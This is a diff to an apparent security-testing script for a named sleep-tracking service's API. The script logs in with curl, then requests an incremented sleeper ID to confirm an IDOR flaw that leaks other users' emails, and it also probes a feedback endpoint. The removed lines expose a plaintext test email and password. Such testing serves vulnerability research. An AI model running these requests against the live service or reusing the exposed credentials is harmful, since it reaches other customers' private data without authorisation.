@@ -13,12 +13,7 @@ import time
 import re
 from pathlib import Path
 
-# Known test credentials
-TEST_EMAIL = "ravance@gmail.com"
-TEST_PASSWORD = "Test3214@"
-YOUR_SLEEPER_ID = "-9223372019953519548"
-
-API_BASE = "https://api.sleepiq.sleepnumber.com/rest"
+from config import config
 
 
 def run_adb(command: str) -> str:
@@ -99,10 +94,10 @@ def authenticate() -> dict:
     """Authenticate and get session cookie"""
     print("\n[2/5] Authenticating to get session cookie...")
 
-    cmd = f"""curl -s -X PUT "{API_BASE}/login" \\
+    cmd = f"""curl -s -X PUT "{config.api_base}/login" \\
         -H "Content-Type: application/json" \\
         -H "X-App-Version: 5.3.30" \\
-        -d '{{"login":"{TEST_EMAIL}","password":"{TEST_PASSWORD}"}}' \\
+        -d '{{"login":"{config.test_email}","password":"{config.test_password}"}}' \\
         -c /tmp/test_cookies.txt"""
 
     response = run_cmd(cmd)
@@ -127,13 +122,13 @@ def test_idor(jsessionid: str, jwt_token: str) -> bool:
     print("\n[3/5] Testing IDOR on Sleeper Endpoint...")
     print("=" * 60)
 
-    test_id = int(YOUR_SLEEPER_ID) + 1
-    print(f"Your Sleeper ID:  {YOUR_SLEEPER_ID}")
+    test_id = int(config.sleeper_id) + 1
+    print(f"Your Sleeper ID:  {config.sleeper_id}")
     print(f"Testing ID:       {test_id}")
     print(f"(Attempting to access another user's data)")
     print("")
 
-    cmd = f"""curl -s "{API_BASE}/sleeper/{test_id}" \\
+    cmd = f"""curl -s "{config.api_base}/sleeper/{test_id}" \\
         -H "Cookie: JSESSIONID={jsessionid}" \\
         -H "Authorization: {jwt_token}" \\
         -H "X-App-Version: 5.3.30" \\
@@ -173,11 +168,11 @@ def test_idor(jsessionid: str, jwt_token: str) -> bool:
 
             if found_email:
                 print(f"Response contains email: {found_email}")
-                print(f"Your email:              {TEST_EMAIL}")
+                print(f"Your email:              {config.test_email}")
                 print("")
 
                 # THE CRITICAL CHECK: Is it a DIFFERENT email?
-                if found_email != TEST_EMAIL:
+                if found_email != config.test_email:
                     print("🚨🚨🚨 CRITICAL VULNERABILITY CONFIRMED! 🚨🚨🚨")
                     print("🚨 Successfully accessed ANOTHER USER's data!")
                     print(f"🚨 Their email: {found_email}")
@@ -215,7 +210,7 @@ def test_feedback_api(jsessionid: str, jwt_token: str) -> bool:
     print("\n[4/5] Testing Feedback API Exposure...")
     print("=" * 60)
 
-    cmd = f"""curl -s "{API_BASE}/feedback" \\
+    cmd = f"""curl -s "{config.api_base}/feedback" \\
         -H "Cookie: JSESSIONID={jsessionid}" \\
         -H "Authorization: {jwt_token}" \\
         -H "X-App-Version: 5.3.30" \\
